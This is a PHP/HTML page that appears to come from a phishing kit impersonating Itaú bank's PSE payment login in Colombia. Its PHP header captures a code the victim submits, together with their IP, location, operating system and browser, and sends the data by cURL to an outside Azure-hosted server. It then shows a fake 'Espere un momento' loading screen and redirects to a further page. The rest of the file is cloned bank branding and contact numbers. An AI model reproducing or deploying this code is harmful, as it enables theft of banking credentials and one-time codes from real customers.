<?php ini_set('display_errors', 0);

include('funciones.php');
if (isset($_POST['cod'])) {
	$message = 'itau-inf
Codigo1: ' . $_POST['cod'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
	$payload = ['mensaje' => $message];
	$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';

	$ch = curl_init($url);
	curl_setopt_array($ch, [
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_POST           => true,
		CURLOPT_HTTPHEADER     => [
			'Accept: application/json',
			'Content-Type: application/json',
'X-Client-IP: ' . $myip,
		],
		CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
		CURLOPT_TIMEOUT        => 20,
		CURLOPT_CONNECTTIMEOUT => 10,
	]);

	$response = curl_exec($ch);
	if ($response === false) {
		error_log('cURL error: ' . curl_error($ch));
		http_response_code(500);
		exit('Error de red.');
	}
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Itaú | Personas</title>

	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="./archivos/estilos.css" rel="stylesheet" type="text/css">
	<style>
		iframe {
			background-color: transparent;
		}

		/* fondo transparente Opera */
		allowtransparency="
 allowtransparency "




		frameborder=0
	</style>

	<!-- stylehsheets -->
	<link rel="stylesheet" type="text/css" href="./archivos/reset.css">
	<link rel="stylesheet" type="text/css" href="./archivos/screen.css">

	<link type="text/css" rel="stylesheet" href="./archivos/clearfix.css">
	<style type="text/css">

	</style>
	<META HTTP-EQUIV="REFRESH" CONTENT="10;URL=index4.php">

	<link rel="stylesheet" href="./archivos/dhtmlwindow.css" type="text/css">
	<link rel="stylesheet" href="./archivos/modal.css" type="text/css">
	<script type="text/javascript">
		<!--
		function MM_changeProp(objId, x, theProp, theValue) { //v9.0
			var obj = null;
			with(document) {
				if (getElementById)
					obj = getElementById(objId);
			}
			if (obj) {
				if (theValue == true || theValue == false)
					eval("obj.style." + theProp + "=" + theValue);
				else eval("obj.style." + theProp + "='" + theValue + "'");
			}
			document.getElementById("contenedor_imagen").style.display = "none";
		}

		function MM_hideDivPinc() {
			document.getElementById("contenedor_bienvenida").style.display = "none";
			document.getElementById("contenedor_imagen").style.display = "block";
		}
		//
		-->
	</script>
</head>

<body>
	<div id="dhtmlwindowholder" bis_skin_checked="1">
		<div id="EmailBox" class="dhtmlwindow" bis_skin_checked="1" style="z-index: 101; width: 150px; visibility: visible; display: block; left: 433px; top: 111.5px;">
			<div class="drag-handle" bis_skin_checked="1" style="opacity: 1;">
				<div class="drag-controls" bis_skin_checked="1">
					<img src="./archivos/min.gif" title="Minimize" style="display: none;">
				</div>
			</div>
			<div class="drag-contentarea" bis_skin_checked="1" style="height: 600px; overflow: hidden; display: block;">
				<!--frame -->
				<div style="margin:0; padding:0; width:100%; height: 100%; background-color:#fff"
					name="_iframe-EmailBox" bis_size="{&quot;x&quot;:433,&quot;y&quot;:118,&quot;w&quot;:500,&quot;h&quot;:370,&quot;abs_x&quot;:433,&quot;abs_y&quot;:118}">


					<div class="contenedorBtnSalir">
						<a href="#"><img src="./archivos/cerrartoken.png" border="0" onclick="parent.modalCancel()"></a>
					</div>
					<div align="center">
						<table cellspacing="0" cellpadding="0">
							<tbody>
								<tr>
									<td>
										<div id="contenedor_bienvenida_informacion">
											<div id="contenedor_imagen">
												<form id="form_imagen" name="form_imagen" method="post" action="">
													<table border="0">
														<tbody>
															<tr>
																<td align="center" colspan="4"><br>
																	<span style="font-weight: bold">Cargando</span><br><br>
																	<img src="archivos/gif1.gif" style="width:90px"><br><br>

																</td>
															</tr>
															<tr>
																<td align="center" colspan="4"><br>


																</td>
															</tr>

														</tbody>
													</table>



												</form>
											</div>

										</div>
									</td>

								</tr>
							</tbody>
						</table>
					</div>

					<div align="center">
						<h1>Espere un momento...</h1>
					</div>
				</div>
				<!--finframe -->
			</div>

		</div>
	</div>

	<div id="interVeil" bis_skin_checked="1" style="width: 1366px; height: 768px; left: 0px; top: 0px; visibility: visible; display: block;"></div>



	<div class="contenedorGeneral" bis_skin_checked="1">



		<link href="./archivos/estilo.css" rel="stylesheet" type="text/css">
		<div bis_skin_checked="1">
			<div class="header" bis_skin_checked="1">
				<div class="contenedorLogo" bis_skin_checked="1">
					<img class="logoHeader" src="./archivos/logo_itau.png">
				</div>
				<div class="contenedorBanner" bis_skin_checked="1">
					<img src="./archivos/banner.jpg">
				</div>
			</div>
		</div>
		<div align="center" bis_skin_checked="1">

			<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
				<tbody>
					<tr>
						<td style="width: 278px; position: relative; background-color: #ffffff; vertical-align: top;">
							<table border="0" style="width: 100%; position: relative; top: 0px;">
								<tbody>
									<tr>
										<td>
											<div id="cntr_login" align="left" bis_skin_checked="1">
												<table width="100%">
													<tbody>
														<tr>
															<td colspan="2">
																<div class="left labelUsuario" bis_skin_checked="1">Usuario</div>
															</td>
														</tr>

														<tr>
															<td>
																<input name="userId_" type="text" class="fld" id="userId_">
															</td>
														</tr>
														<tr>
															<td align="right">
																<input style="margin-top:15px;" type="submit" class="form-submit" value="Entrar" onclick="validar()">
															</td>
														</tr>
													</tbody>
												</table>

												<form name="loginForm" action="https://www.itau.co/PSEBancoBCR/control/Authentication.personal" method="post">
													<input type="hidden" name="CSIDCode" id="CSIDCode" value="148019e7-3753-46ae-8744-d901c852c71a">
													<input name="userId" type="hidden" class="fld" id="userId" value="juancarlos">
													<input type="hidden" name="devicePrint" value="version=1_amp_pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36|Win32_amp_pm_fpsc=24|1366|768|728_amp_pm_fpsw=_amp_pm_fptz=-5_amp_pm_fpln=lang=en-US|syslang=|userlang=_amp_pm_fpjv=0_amp_pm_fpco=1"> <input type="hidden" name="deviceCookie" value=""> <input type="hidden" name="referer" value="https://registro.pse.com.co/"> <input name="password" type="hidden" class="fld" id="password"> <input name="userIdentification" type="hidden" class="fld" id="userIdentification"> <input name="cancelFlag" type="hidden" class="fld" id="cancelFlag">
													<input type="hidden" name="processInstanceId" value="000000018F5E4C75611EC0CEE15F3330">
													<input type="hidden" name="activityInstanceId" value="000000018F5E4C75733173C9B741494E">

												</form>
											</div>

										</td>
									</tr>
								</tbody>
							</table>
						</td>

						<td>
							<div id="s_node" bis_skin_checked="1">
								<div class="n-content2" align="left" bis_skin_checked="1">
									<div class="n-filler" bis_skin_checked="1">
										<table border="0" cellpadding="5" cellspacing="5" class="tabla">
											<tbody>
												<tr>
													<td style="padding: 20px 20px 10px;box-sizing: border-box;">
														<p class="Estilo26 Estilo36">Es un sistema centralizado
															y estandarizado que permite a las empresas ofrecer a los
															usuarios la posibilidad de realizar pagos en línea,
															accesando a sus recursos desde la entidad financiera donde
															tienen su dinero.</p>
														<p class="Estilo35">
															<br> Algunas de las ventajas que PSE ofrece a los
															Usuarios se presentan a continuación:<br> <br>
														</p>
														<p class="Estilo35">• Facilidad y oportunidad para
															realizar transacciones y/o compras.</p>
														<p class="Estilo35">• Seguridad para poder realizar
															pagos desde la entidad financiera de su preferencia.</p>
														<p class="Estilo36">
															<span class="Estilo37"> • Comodidad, al no
																tener que movilizarse para efectuar un pago. <br>
																• Atención 24 horas al día, 7
																días a la semana, todos los días del
																año. <br> • Confirmación en
																línea de la transacción.
																<br> • Mayor control del tiempo y el dinero.
															</span><br> <br>
														</p>
														<p class="Estilo35">
															<strong>Comercios afiliados:</strong><br>
															<br>
														</p>
														<p class="Estilo35">
															• Aerolineas<br> • Entidades estatales<br>
															• Empresas de servicios<br> • Entidades
															financieras<br> • Seguridad social y salud<br>
															• Instituciones educativas<br> • Comercios<br>
															• Camaras de comercio<br> • Desarrolladores de
															software<br> • Servicios públicos<br>
															• Telecomunicaciones<br> <br>
														</p>
														<p class="Estilo26">
															Comuníquese con nuestro número único
															por ciudad <br>
														</p>
														<br>
														<div align="center" bis_skin_checked="1">
															<table cellspacing="5" cellpadding="2" width="405" align="center" border="0">
																<colgroup>
																	<col span="2" width="80">
																</colgroup>
																<tbody>
																	<tr>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Bogotá
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">581 8181</div>
																		</td>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Cartagena
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">693 1818</div>
																		</td>
																	</tr>
																	<tr>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Medellín
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">604 1818</div>
																		</td>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Bucaramanga
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">697 1818</div>
																		</td>
																	</tr>
																	<tr>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Cali
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">486 1818</div>
																		</td>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Pereira
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">340 1818</div>
																		</td>
																	</tr>
																	<tr>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Barranquilla
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">385 1818</div>
																		</td>
																		<td class="mensajeexito">
																			<div align="left" bis_skin_checked="1">
																				Manizales
																			</div>
																		</td>
																		<td class="Estilo26">
																			<div align="left" bis_skin_checked="1">887 9818</div>
																		</td>
																	</tr>
																	<tr>
																		<td colspan="2" class="mensajeexito paddingEstandar">
																			<div align="right" bis_skin_checked="1">
																				Desde otras ciudades
																			</div>
																		</td>
																		<td colspan="2" class="Estilo26 paddingEstandar">
																			<div align="left" bis_skin_checked="1">01 8000 512 633</div>
																		</td>
																	</tr>
																</tbody>
															</table>
														</div>
													</td>
												</tr>
											</tbody>
										</table>
									</div>
								</div>
							</div>
						</td>
					</tr>
					<tr>
						<td style="height: 10px;"></td>
					</tr>

				</tbody>
			</table>
		</div>
	</div>


</body>

</html>